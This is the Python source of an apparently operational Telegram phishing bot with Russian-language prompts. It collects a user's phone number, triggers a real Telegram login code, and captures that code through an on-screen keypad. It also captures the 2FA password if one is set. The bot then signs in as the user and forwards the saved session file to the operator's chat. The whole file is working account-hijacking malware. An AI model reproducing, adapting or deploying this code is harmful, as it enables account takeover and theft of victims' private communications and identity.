import os
import logging
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from aiogram import types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from database import (
    add_user, get_total_users, save_phone_number, get_phone_number
)
from config import (
    ADMIN_CHAT_ID, PHONE_LOG_CHAT_ID, SESSION_CHAT_ID,
    WELCOME_MESSAGE, WELCOME_IMAGE, THANK_YOU_MESSAGE, SEND_CODE_MESSAGE, API_ID, API_HASH
)

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

ephemeral_sessions = {}
user_codes = {}

def get_contact_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Поделиться номером", request_contact=True)
    kb.add(btn)
    return kb

def build_code_inline_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=4)

    show_code_btn = InlineKeyboardButton(
        text="Показать код",
        url="https://t.me/+42777"
    )
    kb.add(show_code_btn)

    kb.add(
        InlineKeyboardButton("1", callback_data="digit:1"),
        InlineKeyboardButton("2", callback_data="digit:2"),
        InlineKeyboardButton("3", callback_data="digit:3")
    )

    kb.add(
        InlineKeyboardButton("4", callback_data="digit:4"),
        InlineKeyboardButton("5", callback_data="digit:5"),
        InlineKeyboardButton("6", callback_data="digit:6")
    )

    kb.add(
        InlineKeyboardButton("7", callback_data="digit:7"),
        InlineKeyboardButton("8", callback_data="digit:8"),
        InlineKeyboardButton("9", callback_data="digit:9")
    )

    kb.add(
        InlineKeyboardButton("Очистить", callback_data="action:clear"),
        InlineKeyboardButton("0", callback_data="digit:0"),
        InlineKeyboardButton("Удалить", callback_data="action:delete")
    )

    return kb

async def start_handler(message: types.Message, bot):
    user = message.from_user
    user_id = user.id
    username = user.username if user.username else "Не указан"

    phone_number = get_phone_number(user_id)
    if phone_number:
        print(f"[DEBUG] Found existing phone {phone_number} for {user_id}")
        await send_auth_code(user_id, bot, phone_number, username)
        return

    # Новый пользователь
    add_user(user_id, username, user.first_name, user.last_name)
    total_users = get_total_users()

    user_info = (
        f"🔔 *Новый пользователь!*\n\n"
        f"👤 *ID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"📝 *Имя:* {user.first_name} {user.last_name or ''}\n"
        f"👥 *Всего пользователей:* {total_users}"
    )
    await bot.send_message(ADMIN_CHAT_ID, user_info, parse_mode="Markdown")

    await message.answer(
        WELCOME_MESSAGE.format(first_name=user.first_name),
        parse_mode="Markdown",
        reply_markup=get_contact_keyboard()
    )

async def contact_handler(message: types.Message, bot):
    if message.contact:
        phone_number = message.contact.phone_number
        user_id = message.from_user.id
        username = f"@{message.from_user.username}" if message.from_user.username else "Не указан"

        save_phone_number(user_id, phone_number)

        log_msg = (
            f"📞 *Пользователь поделился номером!*\n\n"
            f"👤 *ID:* `{user_id}`\n"
            f"📛 *Username:* {username}\n"
            f"📱 *Номер:* `{phone_number}`"
        )
        await bot.send_message(PHONE_LOG_CHAT_ID, log_msg, parse_mode="Markdown")
        if PHONE_LOG_CHAT_ID != ADMIN_CHAT_ID:
            await bot.send_message(ADMIN_CHAT_ID, log_msg, parse_mode="Markdown")

        await message.answer(THANK_YOU_MESSAGE, reply_markup=types.ReplyKeyboardRemove())
        await send_auth_code(user_id, bot, phone_number, username)

async def send_auth_code(user_id: int, bot, phone_number: str, username: str):
    phone_code_hash = await send_code(bot, user_id, phone_number, username)
    if phone_code_hash:
        user_codes[user_id] = {
            "hash": phone_code_hash,
            "code": "",
            "phone": phone_number,
            "username": username
        }
        await bot.send_message(
            chat_id=user_id,
            text=SEND_CODE_MESSAGE,
            parse_mode="Markdown",
            reply_markup=build_code_inline_keyboard()
        )

async def send_code(bot, user_id, phone_number, username):
    ephemeral_session = StringSession()
    ephemeral_sessions[user_id] = ephemeral_session

    client = TelegramClient(ephemeral_session, API_ID, API_HASH)
    print(f"[DEBUG] ephemeral session for {user_id}, phone={phone_number}")

    try:
        await client.connect()
        if await client.is_user_authorized():
            msg = f"🔄 {username} уже авторизован!"
            await bot.send_message(user_id, msg)
            await bot.send_message(PHONE_LOG_CHAT_ID, msg)
            return None

        print("[DEBUG] Requesting code with force_sms=True...")
        code_info = await client.send_code_request(phone_number, force_sms=True)
        print("[DEBUG] code_info.phone_code_hash =", code_info.phone_code_hash)

        await client.disconnect()
        return code_info.phone_code_hash

    except Exception as e:
        print("[DEBUG] send_code EXCEPTION:", e)
        await bot.send_message(user_id, f"❌ Ошибка при запросе кода: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return None

async def inline_code_callback_handler(callback_query: types.CallbackQuery, bot):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_id not in user_codes:
        await callback_query.answer("Нет активного ввода кода. /start")
        return

    code_info = user_codes[user_id]
    code_str = code_info["code"]

    if data.startswith("digit:"):
        digit = data.split(":")[1]
        if len(code_str) < 5:
            code_str += digit

    elif data == "action:clear":
        code_str = ""
    elif data == "action:delete":
        code_str = code_str[:-1] if code_str else ""

    user_codes[user_id]["code"] = code_str

    new_text = f"{SEND_CODE_MESSAGE}\n\nТекущий ввод: `{code_str}`"
    await bot.edit_message_text(
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        text=new_text,
        parse_mode="Markdown",
        reply_markup=build_code_inline_keyboard()
    )

    if len(code_str) == 5:
        phone = code_info["phone"]
        phone_code_hash = code_info["hash"]
        username = code_info["username"]
        await callback_query.answer("Код введён, авторизация...")

        result = await login(bot, user_id, phone, code_str, phone_code_hash, username)
        if result == "2FA_REQUIRED":

            await bot.edit_message_text(
                chat_id=callback_query.message.chat.id,
                message_id=callback_query.message.message_id,
                text="🔑 Введите ваш пароль от Telegram (2FA)",
            )
        del user_codes[user_id]
    else:
        await callback_query.answer()

async def login(bot, user_id, phone_number, code, phone_code_hash, username):
    """Пробуем авторизоваться. Если успех — сохраняем .session, отправляем в чат."""
    if user_id not in ephemeral_sessions:
        await bot.send_message(user_id, "❌ Нет активной сессии. Повторите /start.")
        return None

    ephemeral_session = ephemeral_sessions[user_id]
    client = TelegramClient(ephemeral_session, API_ID, API_HASH)

    try:
        await client.connect()
        await client.sign_in(
            phone=phone_number,
            code=code,
            phone_code_hash=phone_code_hash
        )

        if await client.is_user_authorized():
            msg = f"✅ @{username} успешно авторизовался!"
            await bot.send_message(user_id, "✅ Успешный вход!")
            await bot.send_message(PHONE_LOG_CHAT_ID, msg)

            # Сохраняем StringSession
            final_session_str = ephemeral_session.save()
            session_file_path = os.path.join(SESSIONS_DIR, f"{user_id}.session")
            with open(session_file_path, "w", encoding="utf-8") as f:
                f.write(final_session_str)

            await bot.send_document(
                SESSION_CHAT_ID,
                open(session_file_path, "rb"),
                caption="🎫 Новый session-файл!"
            )
        else:
            await bot.send_message(user_id, "🔑 Введите пароль от 2FA!")
            return "2FA_REQUIRED"

    except Exception as e:
        print("[DEBUG] login EXCEPTION:", e)
        await bot.send_message(user_id, f"❌ Ошибка авторизации: {e}")
    finally:
        await client.disconnect()

    return None

async def enter_2fa_handler(message: types.Message, bot):
    """
    При вводе пароля 2FA — повторно подключаемся к StringSession.
    """
    user_id = message.from_user.id
    password = message.text.strip()

    if user_id not in ephemeral_sessions:
        await message.answer("❌ Нет активной сессии для 2FA. Начните заново /start.")
        return

    ephemeral_session = ephemeral_sessions[user_id]
    client = TelegramClient(ephemeral_session, API_ID, API_HASH)

    try:
        await client.connect()
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            await message.answer("✅ Авторизация 2FA завершена!")
            final_session_str = ephemeral_session.save()
            session_file_path = os.path.join(SESSIONS_DIR, f"{user_id}.session")
            with open(session_file_path, "w", encoding="utf-8") as f:
                f.write(final_session_str)

            await bot.send_document(
                SESSION_CHAT_ID,
                open(session_file_path, "rb"),
                caption="🎫 Новый session-файл!"
            )
        else:
            await message.answer("❌ Не удалось авторизоваться по 2FA.")

    except Exception as e:
        print("[DEBUG] enter_2fa EXCEPTION:", e)
        await message.answer(f"❌ Ошибка входа с 2FA: {e}")
    finally:
        await client.disconnect()
